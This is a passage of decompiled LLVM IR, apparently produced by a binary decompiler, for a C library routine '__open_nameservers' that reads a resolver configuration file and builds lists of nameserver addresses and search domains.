; uselistorder directives
  uselistorder i32* @global_var_2e1e4, { 0, 3, 1, 4, 2, 5 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-536 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i8, align 1
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-540 = alloca i32, align 4
  %v3_1d660 = load i32, i32* @r4, align 4
  %v6_1d660 = load i32, i32* @r5, align 4
  %v18_1d660 = load i32, i32* @sb, align 4
  %v21_1d660 = load i32, i32* @sl, align 4
  %v24_1d660 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_34a9c.1740 to i32), i32* %r3.global-to-local, align 4
  %v2_1d668 = load i32, i32* @global_var_34a9c.1740, align 4
  store i32 %v2_1d668, i32* @r4, align 4
  %v2_1d66c = icmp eq i32 %v2_1d668, 0
  br i1 %v2_1d66c, label %dec_label_pc_1d678, label %dec_label_pc_1d6a4

dec_label_pc_1d678:                               ; preds = %entry
  %v2_1d678 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_1d678, i32* %r1.global-to-local, align 4
  %v4_1d680 = call i32 @__GI_stat(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_25748.1742, i32 0, i32 0), i32 %v2_1d678)
  store i32 %v4_1d680, i32* @r0, align 4
  %v2_1d684 = icmp eq i32 %v4_1d680, 0
  %v1_1d688 = load i32, i32* @r4, align 4
  %.v1_1d688 = select i1 %v2_1d684, i32 %tmp24, i32 %v1_1d688
  store i32 ptrtoint (i32* @global_var_346b0.1744 to i32), i32* %r1.global-to-local, align 4
  store i32 %.v1_1d688, i32* %r2.global-to-local, align 4
  %v2_1d694 = load i32, i32* @global_var_346b0.1744, align 4
  store i32 %v2_1d694, i32* %r3.global-to-local, align 4
  %v9_1d698 = icmp eq i32 %v2_1d694, %.v1_1d688
  br i1 %v9_1d698, label %bb43, label %bb

bb:                                               ; preds = %dec_label_pc_1d678
  store i32 %.v1_1d688, i32* @global_var_346b0.1744, align 4
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_1d678, %bb
  %v1_1d6a0 = xor i1 %v9_1d698, true
  call void @__pseudo_cond_branch(i1 %v1_1d6a0, i32 ptrtoint (i32* @global_var_1da6c.1745 to i32))
  br label %dec_label_pc_1d6a4

dec_label_pc_1d6a4:                               ; preds = %entry, %bb43
  store i32 ptrtoint (i32* @global_var_34aa8.1726 to i32), i32* @r4, align 4
  %v2_1d6a8 = load i32, i32* @global_var_34aa8.1726, align 4
  store i32 %v2_1d6a8, i32* %r3.global-to-local, align 4
  %v2_1d6ac = icmp eq i32 %v2_1d6a8, 0
  br i1 %v2_1d6ac, label %dec_label_pc_1d6b4, label %dec_label_pc_1da0c

dec_label_pc_1d6b4:                               ; preds = %dec_label_pc_1d6a4
  store i32 ptrtoint (i8** @global_var_2e43a.1736 to i32), i32* @r6, align 4
  store i32 ptrtoint (i8** @global_var_2e43b.1724 to i32), i32* @r5, align 4
  store i8 5, i8* bitcast (i8** @global_var_2e43a.1736 to i8*), align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_25748.1742 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_25380.1609 to i32), i32* @r1, align 4
  store i8 3, i8* bitcast (i8** @global_var_2e43b.1724 to i8*), align 4
  %v3_1d6d4 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_25748.1742 to i32), i32 ptrtoint (i32* @global_var_25380.1609 to i32))
  store i32 %v3_1d6d4, i32* @r0, align 4
  store i32 %v3_1d6d4, i32* @fp, align 4
  %v2_1d6d8 = icmp eq i32 %v3_1d6d4, 0
  br i1 %v2_1d6d8, label %dec_label_pc_1d938, label %dec_label_pc_1d900

dec_label_pc_1d6e4:                               ; preds = %dec_label_pc_1d900, %dec_label_pc_1d918.backedge
  %v1_1d6e8 = call i32 @skip_and_NUL_space(i32 %v2_1d918)
  store i32 %v1_1d6e8, i32* @r4, align 4
  %v0_1d6f0 = call i32 @skip_nospace()
  %v1_1d6f4 = call i32 @skip_and_NUL_space(i32 %v0_1d6f0)
  store i32 ptrtoint ([11 x i8]* @global_var_2575c.1751 to i32), i32* @r1, align 4
  store i32 %v1_1d6f4, i32* @r5, align 4
  %v0_1d700 = load i32, i32* @r4, align 4
  %v3_1d704 = inttoptr i32 %v0_1d700 to i8*
  %v4_1d704 = call i32 @__GI_strcoll(i8* %v3_1d704, i32 ptrtoint ([11 x i8]* @global_var_2575c.1751 to i32))
  %sext = mul i32 %v4_1d704, 16777216
  %v1_1d708 = sdiv i32 %sext, 16777216
  store i32 %v1_1d708, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_1d710, label %dec_label_pc_1d7d8

dec_label_pc_1d710:                               ; preds = %dec_label_pc_1d6e4
  %v0_1d714 = call i32 @skip_nospace()
  %v1_1d714 = inttoptr i32 %v0_1d714 to i8*
  %v0_1d718 = load i32, i32* @r6, align 4
  store i32 %v0_1d718, i32* %r1.global-to-local, align 4
  %v1_1d71c = trunc i32 %v0_1d718 to i8
  store i8 %v1_1d71c, i8* %v1_1d714, align 1
  store i32 28, i32* @r2, align 4
  %v3_1d728 = call i32 @__GI_memset(i8* nonnull %stack_var_-64, i32 %v0_1d718)
  %v0_1d730 = load i32, i32* @r5, align 4
  store i32 %v0_1d730, i32* %r1.global-to-local, align 4
  %v2_1d734 = load i32, i32* %stack_var_-540, align 4
  store i32 %v2_1d734, i32* %r2.global-to-local, align 4
  %v3_1d738 = inttoptr i32 %v0_1d730 to i8*
  %v4_1d738 = call i32 @inet_pton(i32 10, i8* %v3_1d738, i32 %v2_1d734)
  %tmp44 = icmp slt i32 %v4_1d738, 1
  br i1 %tmp44, label %dec_label_pc_1d754, label %dec_label_pc_1d77c

dec_label_pc_1d754:                               ; preds = %dec_label_pc_1d710
  %v0_1d754 = load i32, i32* @r5, align 4
  store i32 %v0_1d754, i32* %r1.global-to-local, align 4
  store i32 %v2_1d75c, i32* %r2.global-to-local, align 4
  %v3_1d760 = inttoptr i32 %v0_1d754 to i8*
  %v4_1d760 = call i32 @inet_pton(i32 2, i8* %v3_1d760, i32 %v2_1d75c)
  %tmp45 = icmp slt i32 %v4_1d760, 1
  br i1 %tmp45, label %dec_label_pc_1d918.backedge, label %dec_label_pc_1d77c

dec_label_pc_1d77c:                               ; preds = %dec_label_pc_1d754, %dec_label_pc_1d710
  %v0_1d77c = load i32, i32* @r6, align 4
  %v6_1d77c = trunc i32 %v0_1d77c to i8
  store i8 %v6_1d77c, i8* %stack_var_-64, align 1
  %v2_1d784 = load i32, i32* @global_var_34aa8.1726, align 4
  store i32 28, i32* @r6, align 4
  %tmp46 = mul i32 %v2_1d784, 28
  %v2_1d790 = add i32 %tmp46, 28
  store i32 %v2_1d790, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_34aa4.1733 to i32), i32* %r3.global-to-local, align 4
  %v2_1d798 = load i32, i32* @global_var_34aa4.1733, align 4
  %v2_1d79c = inttoptr i32 %v2_1d798 to i32*
  %v3_1d79c = call i32 @realloc(i32* %v2_1d79c, i32 %v2_1d790)
  store i32 %v3_1d79c, i32* @r5, align 4
  %v2_1d7a0 = icmp eq i32 %v3_1d79c, 0
  br i1 %v2_1d7a0, label %dec_label_pc_1d918.backedge, label %dec_label_pc_1d7a8

dec_label_pc_1d7a8:                               ; preds = %dec_label_pc_1d77c
  %v2_1d7a8 = load i32, i32* @global_var_34aa8.1726, align 4
  store i32 %v2_1d7a8, i32* %r4.global-to-local, align 4
  %v1_1d7ac = load i32, i32* @r6, align 4
  %v3_1d7ac = mul i32 %v1_1d7ac, %v2_1d7a8
  %v4_1d7ac = add i32 %v3_1d7ac, %v3_1d79c
  %v2_1d7b4 = load i8, i8* %stack_var_-64, align 1
  %v3_1d7b4 = sext i8 %v2_1d7b4 to i32
  %v6_1d7b4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v6_1d7b4, i32* %r1.global-to-local, align 4
  %v9_1d7b4 = load i32, i32* %stack_var_-56, align 4
  store i32 %v9_1d7b4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_34aa4.1733 to i32), i32* @r6, align 4
  store i32 %v3_1d79c, i32* @global_var_34aa4.1733, align 4
  %v1_1d7c0 = inttoptr i32 %v4_1d7ac to i32*
  store i32 %v3_1d7b4, i32* %v1_1d7c0, align 4
  %v3_1d7c0 = add i32 %v4_1d7ac, 4
  %v4_1d7c0 = inttoptr i32 %v3_1d7c0 to i32*
  %v5_1d7c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1d7c0, i32* %v4_1d7c0, align 4
  %v6_1d7c0 = add i32 %v4_1d7ac, 8
  %v7_1d7c0 = inttoptr i32 %v6_1d7c0 to i32*
  %v8_1d7c0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1d7c0, i32* %v7_1d7c0, align 4
  %v9_1d7c0 = add i32 %v4_1d7ac, 12
  %v10_1d7c0 = inttoptr i32 %v9_1d7c0 to i32*
  %v11_1d7c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_1d7c0, i32* %v10_1d7c0, align 4
  %v12_1d7c0 = add i32 %v4_1d7ac, 16
  %v2_1d7c4 = load i32, i32* %stack_var_-48, align 4
  %v0_1d7c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d7c8 = add i32 %v0_1d7c8, 1
  store i32 %v1_1d7c8, i32* @r4, align 4
  %v1_1d7cc = inttoptr i32 %v12_1d7c0 to i32*
  store i32 %v2_1d7c4, i32* %v1_1d7cc, align 4
  %v3_1d7cc = add i32 %v4_1d7ac, 20
  %v4_1d7cc = inttoptr i32 %v3_1d7cc to i32*
  %v5_1d7cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1d7cc, i32* %v4_1d7cc, align 4
  %v6_1d7cc = add i32 %v4_1d7ac, 24
  %v7_1d7cc = inttoptr i32 %v6_1d7cc to i32*
  %v8_1d7cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1d7cc, i32* %v7_1d7cc, align 4
  %v0_1d7d0 = load i32, i32* @r4, align 4
  %v1_1d7d0 = load i32, i32* @sb, align 4
  %v2_1d7d0 = inttoptr i32 %v1_1d7d0 to i32*
  store i32 %v0_1d7d0, i32* %v2_1d7d0, align 4
  br label %dec_label_pc_1d918.backedge

dec_label_pc_1d918.backedge:                      ; preds = %dec_label_pc_1d868, %dec_label_pc_1d858, %dec_label_pc_1d824, %dec_label_pc_1d7a8, %dec_label_pc_1d8f0, %dec_label_pc_1d754, %dec_label_pc_1d77c, %dec_label_pc_1d8a0, %dec_label_pc_1d8a8, %dec_label_pc_1d88c, %dec_label_pc_1d8d8
  %v0_1d920.pre = load i32, i32* @fp, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_1d920.pre, i32* %r2.global-to-local, align 4
  %v3_1d924 = call i32 @fgets(i32 %v2_1d918, i32 128, i32 %v0_1d920.pre)
  %v2_1d928 = icmp eq i32 %v3_1d924, 0
  br i1 %v2_1d928, label %dec_label_pc_1d930, label %dec_label_pc_1d6e4

dec_label_pc_1d7d8:                               ; preds = %dec_label_pc_1d6e4
  %v0_1d7d8 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_25768.1754 to i32), i32* @r1, align 4
  %v3_1d7e0 = inttoptr i32 %v0_1d7d8 to i8*
  %v4_1d7e0 = call i32 @__GI_strcoll(i8* %v3_1d7e0, i32 ptrtoint ([7 x i8]* @global_var_25768.1754 to i32))
  %v2_1d7e4 = icmp eq i32 %v4_1d7e0, 0
  br i1 %v2_1d7e4, label %dec_label_pc_1d814.preheader, label %dec_label_pc_1d7ec

dec_label_pc_1d7ec:                               ; preds = %dec_label_pc_1d7d8
  %v0_1d7ec = load i32, i32* @r4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_25770.1756 to i32), i32* @r1, align 4
  %v3_1d7f4 = inttoptr i32 %v0_1d7ec to i8*
  %v4_1d7f4 = call i32 @__GI_strcoll(i8* %v3_1d7f4, i32 ptrtoint ([7 x i8]* @global_var_25770.1756 to i32))
  %v2_1d7f8 = icmp eq i32 %v4_1d7f4, 0
  br i1 %v2_1d7f8, label %dec_label_pc_1d814.preheader, label %dec_label_pc_1d88c

dec_label_pc_1d814.preheader:                     ; preds = %dec_label_pc_1d7d8, %dec_label_pc_1d7ec
  %v0_1d8147 = load i32, i32* @r8, align 4
  %v1_1d8148 = inttoptr i32 %v0_1d8147 to i32*
  %v2_1d8149 = load i32, i32* %v1_1d8148, align 4
  store i32 %v2_1d8149, i32* %r3.global-to-local, align 4
  %v2_1d81811 = icmp eq i32 %v2_1d8149, 0
  %v1_1d81c13 = add i32 %v2_1d8149, -1
  store i32 %v1_1d81c13, i32* %r2.global-to-local, align 4
  br i1 %v2_1d81811, label %dec_label_pc_1d824, label %dec_label_pc_1d804

dec_label_pc_1d804:                               ; preds = %dec_label_pc_1d814.preheader, %dec_label_pc_1d804
  %v1_1d80c = phi i32 [ %v0_1d814, %dec_label_pc_1d804 ], [ %v0_1d8147, %dec_label_pc_1d814.preheader ]
  %v0_1d80c = phi i32 [ %v1_1d81c, %dec_label_pc_1d804 ], [ %v1_1d81c13, %dec_label_pc_1d814.preheader ]
  %v0_1d804 = load i32, i32* @sl, align 4
  %v1_1d804 = inttoptr i32 %v0_1d804 to i32*
  %v2_1d804 = load i32, i32* %v1_1d804, align 4
  store i32 %v2_1d804, i32* %r3.global-to-local, align 4
  %v4_1d808 = mul i32 %v0_1d80c, 4
  %v5_1d808 = add i32 %v2_1d804, %v4_1d808
  %v6_1d808 = inttoptr i32 %v5_1d808 to i32*
  %v7_1d808 = load i32, i32* %v6_1d808, align 4
  store i32 %v7_1d808, i32* @r0, align 4
  %v2_1d80c = inttoptr i32 %v1_1d80c to i32*
  store i32 %v0_1d80c, i32* %v2_1d80c, align 4
  %v0_1d810 = call i32 @free()
  %v0_1d814 = load i32, i32* @r8, align 4
  %v1_1d814 = inttoptr i32 %v0_1d814 to i32*
  %v2_1d814 = load i32, i32* %v1_1d814, align 4
  store i32 %v2_1d814, i32* %r3.global-to-local, align 4
  %v2_1d818 = icmp eq i32 %v2_1d814, 0
  %v1_1d81c = add i32 %v2_1d814, -1
  store i32 %v1_1d81c, i32* %r2.global-to-local, align 4
  br i1 %v2_1d818, label %dec_label_pc_1d824, label %dec_label_pc_1d804

dec_label_pc_1d824:                               ; preds = %dec_label_pc_1d814.preheader, %dec_label_pc_1d804, %dec_label_pc_1d868
  %v0_1d828 = call i32 @skip_nospace()
  %v1_1d82c = call i32 @skip_and_NUL_space(i32 %v0_1d828)
  %v0_1d830 = load i32, i32* @r8, align 4
  %v1_1d830 = inttoptr i32 %v0_1d830 to i32*
  %v2_1d830 = load i32, i32* %v1_1d830, align 4
  store i32 %v1_1d82c, i32* @r4, align 4
  %tmp54 = mul i32 %v2_1d830, 4
  %v3_1d83c = add i32 %tmp54, 4
  store i32 %v3_1d83c, i32* %r1.global-to-local, align 4
  %v0_1d840 = load i32, i32* @sl, align 4
  %v1_1d840 = inttoptr i32 %v0_1d840 to i32*
  %v2_1d840 = load i32, i32* %v1_1d840, align 4
  %v2_1d844 = inttoptr i32 %v2_1d840 to i32*
  %v3_1d844 = call i32 @realloc(i32* %v2_1d844, i32 %v3_1d83c)
  store i32 %v3_1d844, i32* %r3.global-to-local, align 4
  %v2_1d848 = icmp eq i32 %v3_1d844, 0
  %v0_1d84c = load i32, i32* @r5, align 4
  %v0_1d850 = load i32, i32* @r4, align 4
  store i32 %v0_1d850, i32* @r5, align 4
  br i1 %v2_1d848, label %dec_label_pc_1d918.backedge, label %dec_label_pc_1d858

dec_label_pc_1d858:                               ; preds = %dec_label_pc_1d824
  %v1_1d858 = load i32, i32* @sl, align 4
  %v2_1d858 = inttoptr i32 %v1_1d858 to i32*
  store i32 %v3_1d844, i32* %v2_1d858, align 4
  %v1_1d85c = inttoptr i32 %v0_1d84c to i8*
  %v2_1d85c = call i32 @__GI_strdup(i8* %v1_1d85c)
  %v2_1d860 = icmp eq i32 %v2_1d85c, 0
  br i1 %v2_1d860, label %dec_label_pc_1d918.backedge, label %dec_label_pc_1d868

dec_label_pc_1d868:                               ; preds = %dec_label_pc_1d858
  %v0_1d868 = load i32, i32* @r8, align 4
  %v1_1d868 = inttoptr i32 %v0_1d868 to i32*
  %v2_1d868 = load i32, i32* %v1_1d868, align 4
  store i32 %v2_1d868, i32* %r3.global-to-local, align 4
  %v0_1d86c = load i32, i32* @sl, align 4
  %v1_1d86c = inttoptr i32 %v0_1d86c to i32*
  %v2_1d86c = load i32, i32* %v1_1d86c, align 4
  store i32 %v2_1d86c, i32* %r2.global-to-local, align 4
  %v1_1d870 = add i32 %v2_1d868, 1
  store i32 %v1_1d870, i32* %r1.global-to-local, align 4
  %v5_1d874 = mul i32 %v2_1d868, 4
  %v6_1d874 = add i32 %v2_1d86c, %v5_1d874
  %v7_1d874 = inttoptr i32 %v6_1d874 to i32*
  store i32 %v2_1d85c, i32* %v7_1d874, align 4
  %v0_1d878 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d878 = load i32, i32* @r8, align 4
  %v2_1d878 = inttoptr i32 %v1_1d878 to i32*
  store i32 %v0_1d878, i32* %v2_1d878, align 4
  %v0_1d87c = load i32, i32* @r4, align 4
  %v1_1d87c = inttoptr i32 %v0_1d87c to i8*
  %v2_1d87c = load i8, i8* %v1_1d87c, align 1
  %v3_1d87c = zext i8 %v2_1d87c to i32
  store i32 %v3_1d87c, i32* %r3.global-to-local, align 4
  %v2_1d880 = icmp eq i8 %v2_1d87c, 0
  br i1 %v2_1d880, label %dec_label_pc_1d918.backedge, label %dec_label_pc_1d824

dec_label_pc_1d88c:                               ; preds = %dec_label_pc_1d7ec
  %v0_1d88c = load i32, i32* @r4, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_25778.1758 to i32), i32* @r1, align 4
  %v3_1d894 = inttoptr i32 %v0_1d88c to i8*
  %v4_1d894 = call i32 @__GI_strcoll(i8* %v3_1d894, i32 ptrtoint ([8 x i8]* @global_var_25778.1758 to i32))
  %sext5 = mul i32 %v4_1d894, 16777216
  %v1_1d898 = sdiv i32 %sext5, 16777216
  store i32 %v1_1d898, i32* @r4, align 4
  %sext5.off = or i32 %sext5, 16777215
  %tmp55 = icmp ult i32 %sext5.off, 33554431
  br i1 %tmp55, label %dec_label_pc_1d8a0, label %dec_label_pc_1d918.backedge

dec_label_pc_1d8a0:                               ; preds = %dec_label_pc_1d88c
  %v0_1d8a0 = load i32, i32* @r5, align 4
  %v2_1d8a0 = icmp eq i32 %v0_1d8a0, 0
  br i1 %v2_1d8a0, label %dec_label_pc_1d918.backedge, label %dec_label_pc_1d8a8

dec_label_pc_1d8a8:                               ; preds = %dec_label_pc_1d8a0
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1d8b0 = call i32 @__GI_strchr(i32 %v0_1d8a0, i32 58)
  store i32 %v2_1d8b0, i32* @r6, align 4
  %v3_1d8b4 = icmp eq i32 %v2_1d8b0, 0
  br i1 %v3_1d8b4, label %dec_label_pc_1d918.backedge, label %dec_label_pc_1d8bc

dec_label_pc_1d8bc:                               ; preds = %dec_label_pc_1d8a8
  %v0_1d8bc = load i32, i32* @r4, align 4
  %v1_1d8bc = trunc i32 %v0_1d8bc to i8
  %v3_1d8bc = inttoptr i32 %v2_1d8b0 to i8*
  store i8 %v1_1d8bc, i8* %v3_1d8bc, align 1
  %v0_1d8c0 = load i32, i32* @r5, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_25780.1760 to i32), i32* @r1, align 4
  %v3_1d8c8 = inttoptr i32 %v0_1d8c0 to i8*
  %v4_1d8c8 = call i32 @__GI_strcoll(i8* %v3_1d8c8, i32 ptrtoint ([8 x i8]* @global_var_25780.1760 to i32))
  %v2_1d8cc = icmp eq i32 %v4_1d8c8, 0
  br i1 %v2_1d8cc, label %dec_label_pc_1d8f0, label %dec_label_pc_1d8d8

dec_label_pc_1d8d8:                               ; preds = %dec_label_pc_1d8bc
  %v0_1d8d8 = load i32, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_25788.1762 to i32), i32* @r1, align 4
  %v3_1d8e0 = inttoptr i32 %v0_1d8d8 to i8*
  %v4_1d8e0 = call i32 @__GI_strcoll(i8* %v3_1d8e0, i32 ptrtoint ([9 x i8]* @global_var_25788.1762 to i32))
  %v2_1d8e4 = icmp eq i32 %v4_1d8e0, 0
  br i1 %v2_1d8e4, label %dec_label_pc_1d8f0, label %dec_label_pc_1d918.backedge

dec_label_pc_1d8f0:                               ; preds = %dec_label_pc_1d8d8, %dec_label_pc_1d8bc
  %storemerge = phi i32 [ ptrtoint (i8** @global_var_2e43a.1736 to i32), %dec_label_pc_1d8bc ], [ ptrtoint (i8** @global_var_2e43b.1724 to i32), %dec_label_pc_1d8d8 ]
  store i32 %storemerge, i32* @r4, align 4
  %v0_1d8f0 = load i32, i32* @r6, align 4
  %v1_1d8f0 = add i32 %v0_1d8f0, 1
  store i32 %v1_1d8f0, i32* @r0, align 4
  %v1_1d8f4 = call i32 @atol(i32 %v1_1d8f0)
  %v2_1d8f4 = trunc i32 %v1_1d8f4 to i8
  %v3_1d8f8 = load i32, i32* @r4, align 4
  %v4_1d8f8 = inttoptr i32 %v3_1d8f8 to i8*
  store i8 %v2_1d8f4, i8* %v4_1d8f8, align 1
  br label %dec_label_pc_1d918.backedge

dec_label_pc_1d900:                               ; preds = %dec_label_pc_1d6b4
  %v2_1d900 = ptrtoint i8* %stack_var_-64 to i32
  store i32 %v2_1d900, i32* @r7, align 4
  %v2_1d904 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1d904, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_34aac.1720 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_34aa0.1722 to i32), i32* @sl, align 4
  store i32 %v2_1d904, i32* %stack_var_-540, align 4
  %v0_1d914 = load i32, i32* @r4, align 4
  store i32 %v0_1d914, i32* @sb, align 4
  %v2_1d918 = ptrtoint i32* %stack_var_-280 to i32
  %v2_1d75c = ptrtoint i32* %stack_var_-60 to i32
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v3_1d6d4, i32* %r2.global-to-local, align 4
  %v3_1d92451 = call i32 @fgets(i32 %v2_1d918, i32 128, i32 %v3_1d6d4)
  %v2_1d92853 = icmp eq i32 %v3_1d92451, 0
  br i1 %v2_1d92853, label %dec_label_pc_1d930, label %dec_label_pc_1d6e4

dec_label_pc_1d930:                               ; preds = %dec_label_pc_1d918.backedge, %dec_label_pc_1d900
  %v0_1d930 = load i32, i32* @fp, align 4
  %v1_1d934 = inttoptr i32 %v0_1d930 to i8*
  %v2_1d934 = call i32 @__GI_fclose(i8* %v1_1d934)
  store i32 %v2_1d934, i32* @r0, align 4
  br label %dec_label_pc_1d938

dec_label_pc_1d938:                               ; preds = %dec_label_pc_1d6b4, %dec_label_pc_1d930
  %v2_1d93c = load i32, i32* @global_var_34aa8.1726, align 4
  store i32 %v2_1d93c, i32* %r3.global-to-local, align 4
  %v2_1d940 = icmp eq i32 %v2_1d93c, 0
  br i1 %v2_1d940, label %dec_label_pc_1d948, label %dec_label_pc_1d97c

dec_label_pc_1d948:                               ; preds = %dec_label_pc_1d938
  %v1_1d94c = call i32 @malloc(i32 28)
  store i32 %v1_1d94c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_34aa4.1733 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]** @global_var_25794.1767 to i32), i32* %r1.global-to-local, align 4
  %v2_1d958 = icmp eq i32 %v1_1d94c, 0
  br i1 %v2_1d958, label %.thread, label %bb48

.thread:                                          ; preds = %dec_label_pc_1d948
  store i32 ptrtoint ([5 x i8]** @global_var_25794.1767 to i32), i32* @global_var_34aa4.1733, align 4
  br label %bb49

bb48:                                             ; preds = %dec_label_pc_1d948
  store i32 %v1_1d94c, i32* @global_var_34aa4.1733, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %.thread, %bb48
  %v1_1d968 = xor i1 %v2_1d958, true
  call void @__pseudo_cond_branch(i1 %v1_1d968, i32 ptrtoint (i32* @global_var_15840.1559 to i32))
  store i32 ptrtoint (i32* @global_var_34aa8.1726 to i32), i32* %r2.global-to-local, align 4
  %v2_1d970 = load i32, i32* @global_var_34aa8.1726, align 4
  %v1_1d974 = add i32 %v2_1d970, 1
  store i32 %v1_1d974, i32* %r3.global-to-local, align 4
  store i32 %v1_1d974, i32* @global_var_34aa8.1726, align 4
  br label %dec_label_pc_1d97c

dec_label_pc_1d97c:                               ; preds = %dec_label_pc_1d938, %bb49
  store i32 ptrtoint (i32* @global_var_34aac.1720 to i32), i32* @r6, align 4
  %v2_1d980 = load i32, i32* @global_var_34aac.1720, align 4
  store i32 %v2_1d980, i32* @r4, align 4
  %v2_1d984 = icmp eq i32 %v2_1d980, 0
  br i1 %v2_1d984, label %dec_label_pc_1d98c, label %dec_label_pc_1da0c

dec_label_pc_1d98c:                               ; preds = %dec_label_pc_1d97c
  %v2_1d98c = ptrtoint i32* %stack_var_-536 to i32
  store i32 %v2_1d98c, i32* @r5, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1d998 = call i32 @__GI_gethostname(i32 %v2_1d98c, i32 255)
  store i32 %v2_1d998, i32* @r0, align 4
  %v2_1d99c = icmp eq i32 %v2_1d998, 0
  br i1 %v2_1d99c, label %dec_label_pc_1d9a8, label %dec_label_pc_1da0c

dec_label_pc_1d9a8:                               ; preds = %dec_label_pc_1d98c
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1d9b0 = call i32 @__GI_strchr(i32 %v2_1d98c, i32 46)
  store i32 %v2_1d9b0, i32* @r0, align 4
  %v2_1d9b4 = icmp eq i32 %v2_1d9b0, 0
  br i1 %v2_1d9b4, label %dec_label_pc_1da0c, label %dec_label_pc_1d9bc

dec_label_pc_1d9bc:                               ; preds = %dec_label_pc_1d9a8
  %v1_1d9bc = add i32 %v2_1d9b0, 1
  %v2_1d9bc = inttoptr i32 %v1_1d9bc to i8*
  %v3_1d9bc = load i8, i8* %v2_1d9bc, align 1
  %v4_1d9bc = zext i8 %v3_1d9bc to i32
  store i32 %v4_1d9bc, i32* %r3.global-to-local, align 4
  %v2_1d9c0 = icmp eq i8 %v3_1d9bc, 0
  store i32 %v1_1d9bc, i32* @r0, align 4
  br i1 %v2_1d9c0, label %dec_label_pc_1da0c, label %dec_label_pc_1d9cc

dec_label_pc_1d9cc:                               ; preds = %dec_label_pc_1d9bc
  %v2_1d9cc = call i32 @__GI_strdup(i8* %v2_1d9bc)
  store i32 %v2_1d9cc, i32* @r0, align 4
  store i32 %v2_1d9cc, i32* @r4, align 4
  %v2_1d9d0 = icmp eq i32 %v2_1d9cc, 0
  br i1 %v2_1d9d0, label %dec_label_pc_1da0c, label %dec_label_pc_1d9d8

dec_label_pc_1d9d8:                               ; preds = %dec_label_pc_1d9cc
  %v1_1d9dc = call i32 @malloc(i32 4)
  store i32 %v1_1d9dc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_34aa0.1722 to i32), i32* %r3.global-to-local, align 4
  %v2_1d9e4 = icmp eq i32 %v1_1d9dc, 0
  store i32 %v1_1d9dc, i32* @global_var_34aa0.1722, align 4
  br i1 %v2_1d9e4, label %dec_label_pc_1d9f0, label %dec_label_pc_1d9fc

dec_label_pc_1d9f0:                               ; preds = %dec_label_pc_1d9d8
  %v0_1d9f0 = load i32, i32* @r4, align 4
  store i32 %v0_1d9f0, i32* @r0, align 4
  %v0_1d9f4 = call i32 @free()
  store i32 %v0_1d9f4, i32* @r0, align 4
  br label %dec_label_pc_1da0c

dec_label_pc_1d9fc:                               ; preds = %dec_label_pc_1d9d8
  %v2_1d9fc = load i32, i32* @global_var_34aac.1720, align 4
  %v1_1da00 = add i32 %v2_1d9fc, 1
  store i32 %v1_1da00, i32* %r3.global-to-local, align 4
  %v0_1da04 = load i32, i32* @r4, align 4
  %v2_1da04 = inttoptr i32 %v1_1d9dc to i32*
  store i32 %v0_1da04, i32* %v2_1da04, align 4
  %v0_1da08 = load i32, i32* %r3.global-to-local, align 4
  %v1_1da08 = load i32, i32* @r6, align 4
  %v2_1da08 = inttoptr i32 %v1_1da08 to i32*
  store i32 %v0_1da08, i32* %v2_1da08, align 4
  br label %dec_label_pc_1da0c

dec_label_pc_1da0c:                               ; preds = %dec_label_pc_1d98c, %dec_label_pc_1d97c, %dec_label_pc_1d6a4, %dec_label_pc_1d9cc, %dec_label_pc_1d9bc, %dec_label_pc_1d9a8, %dec_label_pc_1d9f0, %dec_label_pc_1d9fc
  %v2_1da10 = load i32, i32* @global_var_34a9c.1740, align 4
  store i32 %v2_1da10, i32* %r3.global-to-local, align 4
  %v2_1da14 = icmp eq i32 %v2_1da10, 0
  br i1 %v2_1da14, label %.thread6, label %bb50

bb50:                                             ; preds = %dec_label_pc_1da0c
  call void @__pseudo_branch(i32 %v2_1da10)
  br label %.thread6

